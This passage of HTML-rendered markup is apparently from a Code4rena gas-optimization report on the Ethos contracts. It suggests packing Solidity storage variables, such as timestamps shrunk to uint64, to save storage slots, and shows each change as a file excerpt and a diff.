class=\"mtk12\">mintingPaused</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">false</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">51</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">private</span><span class=\"mtk1\"> </span><span class=\"mtk12\">immutable</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_HASHED_NAME</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">52</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">private</span><span class=\"mtk1\"> </span><span class=\"mtk12\">immutable</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_HASHED_VERSION</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">54</span><span class=\"mtk1\">:    </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) </span><span class=\"mtk12\">private</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_nonces</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">67</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">troveManagerAddress</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"79\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/Ethos-Core/contracts/LUSDToken.sol b/Ethos-Core/contracts/LUSDToken.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 9c5424d..49f2194 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/Ethos-Core/contracts/LUSDToken.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/Ethos-Core/contracts/LUSDToken.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -34,7 +34,7 @@ contract LUSDToken is CheckContract, ILUSDToken {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     string constant internal _VERSION = &quot;1&quot;;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     uint8 constant internal _DECIMALS = 18;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    bool public mintingPaused = false;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     // --- Data for EIP2612 ---</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -62,6 +62,8 @@ contract LUSDToken is CheckContract, ILUSDToken {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     mapping (address =&gt; bool) public troveManagers;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     mapping (address =&gt; bool) public stabilityPools;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     mapping (address =&gt; bool) public borrowerOperations;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    bool public mintingPaused = false;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     // simple address variables track current version that can mint (in addition to burning)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     // this design makes it so that only the latest version can open troves</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     address public troveManagerAddress;</span></span></span></code></pre>\n<h3 id=\"reapervaultv2sol-pack-treasury-with-emergencyshutdown-and-lastreport4k-gas\" style=\"position:relative;\"><a href=\"#reapervaultv2sol-pack-treasury-with-emergencyshutdown-and-lastreport4k-gas\" aria-label=\"reapervaultv2sol pack treasury with emergencyshutdown and lastreport4k gas permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>ReaperVaultV2.sol: pack treasury with emergencyShutdown and lastReport(4k gas)</h3>\n<p><a href=\"https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Vault/contracts/ReaperVaultV2.sol#L46-L78\">https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Vault/contracts/ReaperVaultV2.sol#L46-L78</a></p>\n<p><strong>lastReport being a timestamp we can get away with using uint64 - should be safe for around 530 years(Following this direction we can save 2 SLOTS : 4k gas)</strong></p>\n<p>If not willing to to reduce the timestamp variable we can pack <code>address treasury and bool emergencyShutdown</code> saving 1 SLOT: 2k gas</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"80\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">Ethos</span><span class=\"mtk1\">-</span><span class=\"mtk12\">Vault</span><span class=\"mtk1\">/</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">ReaperVaultV2</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">46</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">lastReport</span><span class=\"mtk1\">; </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">48</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">immutable</span><span class=\"mtk1\"> </span><span class=\"mtk12\">constructionTime</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">49</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">emergencyShutdown</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">57</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">lockedProfit</span><span class=\"mtk1\">; </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">78</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">treasury</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"81\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/Ethos-Vault/contracts/ReaperVaultV2.sol b/Ethos-Vault/contracts/ReaperVaultV2.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index b5f2a58..e462619 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/Ethos-Vault/contracts/ReaperVaultV2.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/Ethos-Vault/contracts/ReaperVaultV2.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -43,10 +43,12 @@ contract ReaperVaultV2 is ReaperAccessControl, ERC20, IERC4626Events, AccessCont</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     uint256 public totalAllocBPS; // Sum of allocBPS across all strategies (in BPS, &lt;= 10k)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     uint256 public totalAllocated; // Amount of tokens that have been allocated to all strategies</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    uint256 public lastReport; // block.timestamp of last report from any strategy</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    uint64 public lastReport; // block.timestamp of last report from any strategy</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    bool public emergencyShutdown;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    address public treasury; // address to whom performance fee is remitted in the form of vault shares</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     uint256 public immutable constructionTime;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    bool public emergencyShutdown;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     // The token the vault accepts and looks to maximize.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     IERC20Metadata public immutable token;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -75,7 +77,6 @@ contract ReaperVaultV2 is ReaperAccessControl, ERC20, IERC4626Events, AccessCont</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     bytes32 public constant GUARDIAN = keccak256(&quot;GUARDIAN&quot;);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     bytes32 public constant ADMIN = keccak256(&quot;ADMIN&quot;);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    address public treasury; // address to whom performance fee is remitted in the form of vault shares</span></span></span></code></pre>\n<h3 id=\"save-1-slot2k-gas-pack-lastfeeoperationtime-with-owner\" style=\"position:relative;\"><a href=\"#save-1-slot2k-gas-pack-lastfeeoperationtime-with-owner\" aria-label=\"save 1 slot2k gas pack lastfeeoperationtime with owner permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Save 1 SLOT(2k gas): Pack lastFeeOperationTime with owner</h3>\n<p><a href=\"https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/TroveManager.sol#L21-L66\">https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/TroveManager.sol#L21-L66</a></p>\n<p><strong>lastFeeOperationTime is a  timestamps thus we can use uint64 which would be safe for around 532 years</strong></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"82\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">Ethos</span><span class=\"mtk1\">-</span><span class=\"mtk12\">Core</span><span class=\"mtk1\">/</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">TroveManager</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">21</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">owner</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">65</span><span class=\"mtk1\">:    </span><span class=\"mtk3\">// The timestamp of the latest fee operation (redemption or new LUSD issuance)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">66</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">lastFeeOperationTime</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"83\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/Ethos-Core/contracts/TroveManager.sol b/Ethos-Core/contracts/TroveManager.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 6f587d9..38da844 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/Ethos-Core/contracts/TroveManager.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/Ethos-Core/contracts/TroveManager.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -20,6 +20,9 @@ contract TroveManager is LiquityBase, /*Ownable,*/ CheckContract, ITroveManager</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     address public owner;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        // The timestamp of the latest fee operation (redemption or new LUSD issuance)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    uint64 public lastFeeOperationTime;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     // --- Connected contract declarations ---</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     address public borrowerOperationsAddress;</span></span></span></code></pre>\n<h3 id=\"save-2-slots4k-gas-see-description\" style=\"position:relative;\"><a href=\"#save-2-slots4k-gas-see-description\" aria-label=\"save 2 slots4k gas see description permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Save 2 SLOTS(4k gas): see description</h3>\n<p><a href=\"https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/LQTY/CommunityIssuance.sol#L21-L46\">https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/LQTY/CommunityIssuance.sol#L21-L46</a></p>\n<p><strong>lastDistributionTime and lastIssuanceTimestamp are timestamps thus we can use uint64 which would be safe for around 532 years</strong></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"84\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">Ethos</span><span class=\"mtk1\">-</span><span class=\"mtk12\">Core</span><span class=\"mtk1\">/</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">LQTY</span><span class=\"mtk1\">/</span><span class=\"mtk12\">CommunityIssuance</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">21</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">initialized</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">false</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">37</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">IERC20</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">OathToken</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">39</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">stabilityPoolAddress</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">41</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">totalOATHIssued</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">42</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">lastDistributionTime</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">43</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">distributionPeriod</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">44</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rewardPerSecond</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">46</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">lastIssuanceTimestamp</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"85\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/Ethos-Core/contracts/LQTY/CommunityIssuance.sol b/Ethos-Core/contracts/LQTY/CommunityIssuance.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index c79adfe..e7f21ff 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/Ethos-Core/contracts/LQTY/CommunityIssuance.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/Ethos-Core/contracts/LQTY/CommunityIssuance.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -19,6 +19,7 @@ contract CommunityIssuance is ICommunityIssuance, Ownable, CheckContract, BaseMa</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     string constant public NAME = &quot;CommunityIssuance&quot;;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     bool public initialized = false;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    uint64 public lastDistributionTime;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    /* The issuance factor F determines the curvature of the issuance curve.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     *</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -37,13 +38,14 @@ contract CommunityIssuance is ICommunityIssuance, Ownable, CheckContract, BaseMa</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     IERC20 public OathToken;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     address public stabilityPoolAddress;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    uint64 public lastIssuanceTimestamp;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     uint public totalOATHIssued;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    uint public lastDistributionTime;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     uint public distributionPeriod;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     uint public rewardPerSecond;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    uint public lastIssuanceTimestamp;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span></code></pre>\n<h3 id=\"save-2-slots4k-gas-pack-lastharvesttimestamp-and-upgradeproposaltime\" style=\"position:relative;\"><a href=\"#save-2-slots4k-gas-pack-lastharvesttimestamp-and-upgradeproposaltime\" aria-label=\"save 2 slots4k gas pack lastharvesttimestamp and upgradeproposaltime permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Save 2 SLOTS(4k gas): Pack lastHarvestTimestamp and upgradeProposalTime</h3>\n<p><a href=\"https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Vault/contracts/abstract/ReaperBaseStrategyv4.sol#L28-L58\">https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Vault/contracts/abstract/ReaperBaseStrategyv4.sol#L28-L58</a></p>\n<p><strong>lastHarvestTimestamp and upgradeProposalTime are timestamps thus we can use uint64 which would be safe for around 532 years</strong></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"86\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">Ethos</span><span class=\"mtk1\">-</span><span class=\"mtk12\">Vault</span><span class=\"mtk1\">/</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">abstract</span><span class=\"mtk1\">/</span><span class=\"mtk12\">ReaperBaseStrategyv4</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">28</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">want</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">30</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">emergencyExit</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">31</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">lastHarvestTimestamp</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">33</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">upgradeProposalTime</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">58</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> 